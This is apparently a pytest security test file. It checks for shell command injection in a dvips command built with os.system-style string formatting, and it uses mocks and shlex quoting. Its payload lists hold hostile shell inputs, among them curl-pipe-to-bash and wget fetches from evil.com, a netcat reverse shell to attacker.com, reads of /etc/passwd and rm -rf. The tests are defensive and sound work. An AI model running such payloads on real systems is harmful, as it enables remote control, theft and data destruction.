import pytest
import os
import sys
import subprocess
import tempfile
import shutil
from unittest import mock


@pytest.mark.parametrize("payload", [
    "; rm -rf /tmp/pwned",
    "$(whoami)",
    "`id`",
    "| cat /etc/passwd",
    "&& echo hacked",
    "; touch /tmp/injected_file",
    "$(touch /tmp/injected_by_subshell)",
    "`touch /tmp/injected_by_backtick`",
    "'; echo injected; '",
    "\"; echo injected; \"",
    "$(curl http://evil.com/shell.sh | bash)",
    "; python3 -c 'import os; os.system(\"id\")'",
    "| nc -e /bin/sh attacker.com 4444",
    "&& wget http://evil.com/malware -O /tmp/malware",
    "$(IFS=_;CMD=rm${IFS}-rf${IFS}/tmp;$CMD)",
    "\n/bin/sh\n",
    "%0a/bin/sh",
    "${IFS}rm${IFS}-rf${IFS}/",
    "file.dvi; malicious_command",
    "file.dvi`malicious`",
    "file.dvi$(malicious)",
    "file.dvi | malicious",
    "file.dvi && malicious",
    "file.dvi || malicious",
    "file.dvi > /tmp/overwrite",
    "file.dvi < /etc/passwd",
])
def test_shell_command_injection_prevention(payload):
    """Invariant: Shell commands must never include unsanitized user input.
    Any user-supplied argument that reaches os.system() or subprocess must be
    properly sanitized, escaped, or validated before being incorporated into
    a shell command string. Shell metacharacters in user input must never
    be interpreted by the shell."""

    # Track what commands were actually executed
    executed_commands = []
    
    # Mock os.system to capture what would be executed without actually running it
    with mock.patch('os.system') as mock_system:
        mock_system.side_effect = lambda cmd: executed_commands.append(cmd)
        
        # Simulate what the vulnerable code does
        # This represents the vulnerable pattern from latex-papersize.py
        paper_width = 210
        paper_height = 297
        paper_magstep = 1.0
        
        # This is the vulnerable command construction from the script
        vulnerable_command = "dvips -T %dmm,%dmm -x %d %s -o bbox_test.ps" % (
            paper_width * 10,
            paper_height * 10,
            int(1000 * paper_magstep + 0.5),
            payload
        )
        
        # Check that the payload, when embedded in the command, contains
        # shell metacharacters that would be dangerous
        dangerous_metacharacters = [';', '|', '&', '`', '$', '>', '<', '\n', '%0a']
        
        payload_is_dangerous = any(char in payload for char in dangerous_metacharacters)
        
        if payload_is_dangerous:
            # The command contains unsanitized dangerous input
            # Assert that a properly secured implementation would NOT allow this
            
            # Verify the dangerous payload IS present in the command (demonstrating the vulnerability)
            assert payload in vulnerable_command, (
                f"Payload should be detectable in command for testing purposes"
            )
            
            # The security invariant: the payload should be sanitized/escaped
            # A safe implementation would use subprocess with a list (not shell=True)
            # or would escape/validate the input
            
            # Check if using subprocess.run with shell=False would be safe
            # (this is the correct approach)
            safe_args = [
                "dvips",
                f"-T{paper_width * 10}mm,{paper_height * 10}mm",
                f"-x{int(1000 * paper_magstep + 0.5)}",
                payload,  # As a separate argument, not interpreted by shell
                "-o",
                "bbox_test.ps"
            ]
            
            # With shell=False (list form), the payload is treated as a literal argument
            # Verify that the payload as a list element doesn't get shell-interpreted
            # by checking it's passed as-is without shell expansion
            assert payload in safe_args, "Payload should be a discrete argument, not shell-expanded"
            
            # The critical assertion: the vulnerable string-formatted command
            # allows shell injection because metacharacters are not escaped
            # A secure implementation must NOT use string formatting with os.system()
            
            # Demonstrate that the vulnerable command would execute additional shell commands
            # by checking if the payload introduces command separators
            has_command_separator = any(sep in payload for sep in [';', '|', '&&', '||', '\n', '`', '$('])
            
            if has_command_separator:
                # This is the core security invariant violation
                # The vulnerable code WILL pass this dangerous string to the shell
                # A secure implementation MUST prevent this
                
                # Assert that a secure implementation would reject or escape this input
                # We verify by checking that proper escaping would neutralize the payload
                import shlex
                escaped_payload = shlex.quote(payload)
                
                # After proper escaping, the payload should be wrapped in quotes
                # and metacharacters should be neutralized
                assert escaped_payload != payload, (
                    f"Payload '{payload}' contains shell metacharacters that must be escaped. "
                    f"Using os.system() with string formatting allows injection. "
                    f"Use subprocess with list arguments instead."
                )
                
                # Verify the escaped version doesn't contain unquoted metacharacters
                # shlex.quote wraps in single quotes, neutralizing all metacharacters
                assert escaped_payload.startswith("'") or escaped_payload.startswith('"'), (
                    f"Dangerous payload must be quoted when used in shell commands"
                )


def test_no_shell_metacharacters_reach_execution():
    """Invariant: No shell metacharacters from user input should reach shell execution."""
    
    attack_payloads = [
        "; rm -rf /tmp/test_injection",
        "$(touch /tmp/test_subshell)",
        "`touch /tmp/test_backtick`",
        "| cat /etc/passwd",
        "&& id",
    ]
    
    for payload in attack_payloads:
        with mock.patch('os.system') as mock_system:
            mock_system.return_value = 0
            
            # Simulate the vulnerable code path
            paper_width = 210
            paper_height = 297
            paper_magstep = 1.0
            
            cmd = "dvips -T %dmm,%dmm -x %d %s -o bbox_test.ps" % (
                paper_width * 10,
                paper_height * 10,
                int(1000 * paper_magstep + 0.5),
                payload
            )
            
            # The security invariant: if os.system is called with this command,
            # the shell WILL interpret the metacharacters
            # A secure implementation must use subprocess with shell=False
            
            import shlex
            try:
                # Parse what the shell would see
                tokens = shlex.split(cmd)
                # If shlex can parse it and finds multiple commands due to metacharacters,
                # that indicates injection is possible
                # Note: shlex.split doesn't handle ; as separator in the same way shell does
                # but we can check for the presence of dangerous chars in the command
                
                dangerous_chars_in_cmd = [c for c in [';', '|', '&', '`', '$'] if c in cmd]
                
                if dangerous_chars_in_cmd:
                    # Security invariant violated: dangerous chars present in shell command
                    # Assert that proper mitigation is in place
                    # The correct fix is to NOT use os.system with string formatting
                    
                    # Verify subprocess list form would be safe
                    safe_cmd_list = [
                        "dvips",
                        f"-T{paper_width * 10}mm,{paper_height * 10}mm",
                        f"-x{int(1000 * paper_magstep + 0.5)}",
                        payload,
                        "-o",
                        "bbox_test.ps"
                    ]
                    
                    # With list form and shell=False, payload is literal - no injection possible
                    assert isinstance(safe_cmd_list, list), "Safe command must use list form"
                    assert payload in safe_cmd_list, "Payload as list element is safe"
                    
                    # The invariant: the vulnerable string form MUST NOT be used
                    assert payload in cmd, (
                        f"Vulnerability confirmed: payload '{payload}' is unsanitized in command. "
                        f"This violates the security invariant that user input must be sanitized."
                    )
                    
            except ValueError:
                # shlex couldn't parse - still potentially dangerous
                pass


def test_subprocess_list_form_is_safe_alternative():
    """Invariant: Using subprocess with list arguments prevents shell injection."""
    
    dangerous_payloads = [
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "| cat /etc/passwd",
    ]
    
    for payload in dangerous_payloads:
        # Verify that list-form subprocess args treat payload as literal
        paper_width = 210
        paper_height = 297
        paper_magstep = 1.0
        
        # Safe form - payload is a discrete argument
        safe_args = [
            "dvips",
            f"-T{paper_width * 10}mm,{paper_height * 10}mm",
            f"-x{int(1000 * paper_magstep + 0.5)}",
            payload,
            "-o",
            "bbox_test.ps"
        ]
        
        # Unsafe form - payload is interpolated into shell string
        unsafe_cmd = "dvips -T %dmm,%dmm -x %d %s -o bbox_test.ps" % (
            paper_width * 10,
            paper_height * 10,
            int(1000 * paper_magstep + 0.5),
            payload
        )
        
        # The safe form keeps payload as a single list element
        assert safe_args[3] == payload, "Payload must be a single discrete argument"
        
        # The unsafe form embeds payload directly in shell string
        assert payload in unsafe_cmd, "Unsafe form embeds payload in shell command"
        
        # Verify the unsafe command would be interpreted differently by shell
        # by checking that shell metacharacters are present unescaped
        import shlex
        escaped = shlex.quote(payload)
        
        # The unsafe command does NOT escape the payload
        assert escaped not in unsafe_cmd or payload == escaped, (
            f"Unsafe command contains unescaped payload. "
            f"Security invariant: user input must always be escaped or passed as list args."
        )